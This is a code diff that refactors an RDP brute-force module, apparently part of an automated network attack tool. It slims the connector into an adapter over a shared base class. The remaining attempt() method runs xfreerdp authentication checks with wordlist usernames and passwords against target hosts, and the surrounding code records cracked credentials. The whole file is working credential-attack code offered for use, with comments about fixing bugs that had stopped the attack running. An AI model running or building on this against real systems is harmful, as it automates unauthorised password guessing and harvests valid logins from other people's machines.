@@ -1,98 +1,47 @@
 """
-rdp_connector.py - This script performs a brute force attack on RDP services (port 3389) to find accessible accounts using various user credentials. It logs the results of successful connections.
-"""
+rdp_connector.py — RDP brute force (port 3389).
 
-import os
-import subprocess
-import threading
+Thin adapter over BaseConnector (#12). Only attempt() and the module-level
+b_* discovery globals live here; queue/worker/run_bruteforce are shared.
+
+Historical note: this connector is why the base exists. Its run_bruteforce used to reference
+mac_address/hostname in the queue-fill loop before assigning them, so every real attack raised
+UnboundLocalError and RDP never tried a single credential (#1). The ordering now lives in
+base_connector.run_bruteforce, once, for all six protocols.
+"""
 import logging
-import time
-from rich.console import Console
-from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
-from queue import Queue
-from shared import SharedData, netkb_targets, append_csv_rows, dedupe_csv, credential_candidates, record_cracked_cred
+import subprocess
+from base_connector import BaseConnector, BaseBruteforce
 from logger import Logger
 
-# Configure the logger
 logger = Logger(name="rdp_connector.py", level=logging.DEBUG)
 
-# Define the necessary global variables
 b_class = "RDPBruteforce"
 b_module = "rdp_connector"
 b_status = "brute_force_rdp"
 b_port = 3389
 b_parent = None
 
-class RDPBruteforce:
-    """
-    Class to handle the RDP brute force process.
-    """
-    def __init__(self, shared_data):
-        self.shared_data = shared_data
-        self.rdp_connector = RDPConnector(shared_data)
-        logger.info("RDPConnector initialized.")
 
-    def bruteforce_rdp(self, ip, port, row=None):
-        """
-        Run the RDP brute force attack on the given IP and port.
-        """
-        logger.info(f"Running bruteforce_rdp on {ip}:{port}...")
-        return self.rdp_connector.run_bruteforce(ip, port, row)
-    
-    def execute(self, ip, port, row, status_key):
-        """
-        Execute the brute force attack and update status.
-        """
-        logger.info(f"Executing RDPBruteforce on {ip}:{port}...")
-        self.shared_data.bjornorch_status = "RDPBruteforce"
-        success, results = self.bruteforce_rdp(ip, port, row)
-        return 'success' if success else 'failed'
+class RDPConnector(BaseConnector):
+    PORT = 3389
+    HEADER = "MAC Address,IP Address,Hostname,User,Password,Port\n"
+    OUTFILE_ATTR = "rdpfile"
+    PROGRESS_LABEL = "RDP"
+    QUEUE_HAS_MAC = True
 
-class RDPConnector:
-    """
-    Class to manage the connection attempts and store the results.
-    """
-    def __init__(self, shared_data):
-        self.shared_data = shared_data
-        self.load_scan_file()
-
-        self.users = open(shared_data.usersfile, "r").read().splitlines()
-        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()
-
-        self.lock = threading.Lock()
-        self.rdpfile = shared_data.rdpfile
-        # If the file doesn't exist, it will be created
-        if not os.path.exists(self.rdpfile):
-            logger.info(f"File {self.rdpfile} does not exist. Creating...")
-            with open(self.rdpfile, "w") as f:
-                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
-        self.results = []  # List to store results temporarily
-        self.queue = Queue()
-        self.console = Console()
-
-    def load_scan_file(self):
-        """
-        Load the netkb file and filter it for RDP ports.
-        """
-        self.scan = netkb_targets(self.shared_data.netkbfile, "3389")
-
-    def rdp_connect(self, adresse_ip, user, password):
-        """
-        Attempt to connect to an RDP service using the given credentials.
-        """
+    def attempt(self, adresse_ip, user, password):
+        """Auth-only xfreerdp connect. Exit code 0 is a valid credential."""
         # argv list, never a shell string: `password` is wordlist / credential-pool data, and a
         # value containing `;` or `$(...)` would otherwise run as a command instead of being tried
-        # as a password.
+        # as a password. Pinned by tests/test_command_injection.py.
         command = ["xfreerdp", f"/v:{adresse_ip}", f"/u:{user}", f"/p:{password}",
                    "/cert:ignore", "+auth-only"]
         try:
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            # Hard timeout so a black-holed host cannot hang the worker forever.
+            # Hard timeout (#4) so a black-holed host cannot hang the worker forever.
             stdout, stderr = process.communicate(timeout=15)
-            if process.returncode == 0:
-                return True
-            else:
-                return False
+            return process.returncode == 0
         except subprocess.TimeoutExpired:
             process.kill()
             process.communicate()  # drain
@@ -104,130 +53,25 @@ class RDPConnector:
             # narrower clause and propagated out of the worker thread.
             logger.error(f"xfreerdp could not be run for {adresse_ip}: {e}")
             return False
-        except subprocess.SubprocessError as e:
+        except subprocess.SubprocessError:
             return False
 
-    def worker(self, progress, task_id, success_flag):
-        """
-        Worker thread to process items in the queue.
-        """
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping worker thread.")
-                break
 
-            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
-            # try/finally so task_done() ALWAYS runs. Anything raising out of the connect kills
-            # this worker thread before task_done(), and the queue.join() in run_bruteforce then
-            # blocks FOREVER, taking the orchestrator with it. For RDP that is not hypothetical:
-            # a box without xfreerdp raises FileNotFoundError, which is an OSError and so slips
-            # past rdp_connect's `except subprocess.SubprocessError`.
-            try:
-                if self.rdp_connect(adresse_ip, user, password):
-                    with self.lock:
-                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
-                        record_cracked_cred(self.shared_data, user, password)
-                        logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
-                        self.save_results()
-                        self.removeduplicates()
-                        success_flag[0] = True
-            except Exception as e:
-                logger.error(f"rdp_connect failed for {adresse_ip} as {user}: {e}")
-            finally:
-                self.queue.task_done()
-            progress.update(task_id, advance=1)
+class RDPBruteforce(BaseBruteforce):
+    connector_class = RDPConnector
+    display_name = "RDPBruteforce"
 
-    def run_bruteforce(self, adresse_ip, port, row=None):
-        # Resolve mac/hostname BEFORE the queue-fill loop that uses them. They used to be recovered
-        # lower down, inside the `with Progress` block, but the queue.put() below references them —
-        # so a real run (orchestrator_should_exit=False) raised UnboundLocalError on the first
-        # candidate and every RDP host was marked failed: the brute force never tried a credential.
-        # The other five connectors resolve these first; this now matches them.
-        #
-        # netkb already came in as `row` from the orchestrator, which read it this cycle. Re-parsing
-        # the whole file to recover two fields we were handed cost a full csv.DictReader pass per
-        # host per action. `row=None` keeps the standalone __main__ path working via the old lookup.
-        if row is not None:
-            mac_address = row.get('MAC Address', '')
-            hostname = row.get('Hostnames', '')
-        else:
-            self.load_scan_file()
-            match = next((r for r in self.scan if r.get('IPs') == adresse_ip), None)
-            if match is None:
-                logger.error(f"No netkb entry for {adresse_ip}; skipping.")
-                return False, []
-            mac_address = match['MAC Address']
-            hostname = match['Hostnames']
-
-        candidates = credential_candidates(self.shared_data, self.users, self.passwords)
-        total_tasks = len(candidates)
-
-        for user, password in candidates:
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                return False, []
-            self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
-
-        success_flag = [False]
-        threads = []
-
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-            task_id = progress.add_task("[cyan]Bruteforcing RDP...", total=total_tasks)
-
-            for _ in range(self.shared_data.bruteforce_threads):  # config-driven, core-aware (shared_data.bruteforce_threads)
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
-                t.start()
-                threads.append(t)
-
-            while not self.queue.empty():
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                    while not self.queue.empty():
-                        self.queue.get()
-                        self.queue.task_done()
-                    break
-                # Yield. With no exit signal this body does nothing, so it span a core flat
-                # out for the whole attack, competing with the worker threads it waits on.
-                # queue.join() below already blocks correctly; this loop exists only to
-                # notice an exit signal and drain the queue.
-                time.sleep(0.2)
-
-            self.queue.join()
-
-            for t in threads:
-                t.join()
-
-        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
-
-    def save_results(self):
-        """
-        Save the results of successful connection attempts to a CSV file.
-        """
-        append_csv_rows(self.rdpfile, self.results)
-        self.results = []  # Reset temporary results after saving
-
-    def removeduplicates(self):
-        """
-        Remove duplicate entries from the results CSV file.
-        """
-        dedupe_csv(self.rdpfile)
 
 if __name__ == "__main__":
+    from shared import SharedData
     shared_data = SharedData()
     try:
         rdp_bruteforce = RDPBruteforce(shared_data)
-        logger.info("Démarrage de l'attaque RDP... sur le port 3389")
-        
-        # Load the netkb file and get the IPs to scan
-        ips_to_scan = shared_data.read_data()
-        
-        # Execute the brute force on each IP
-        for row in ips_to_scan:
+        logger.info("Starting RDP brute-force attack on port 3389...")
+        for row in shared_data.read_data():
             ip = row["IPs"]
             logger.info(f"Executing RDPBruteforce on {ip}...")
             rdp_bruteforce.execute(ip, b_port, row, b_status)
-        
-        logger.info(f"Nombre total de succès: {len(rdp_bruteforce.rdp_connector.results)}")
-        exit(len(rdp_bruteforce.rdp_connector.results))
+        logger.info(f"Total number of successes: {len(rdp_bruteforce.connector.results)}")
     except Exception as e:
-        logger.error(f"Erreur: {e}")
+        logger.error(f"Error: {e}")
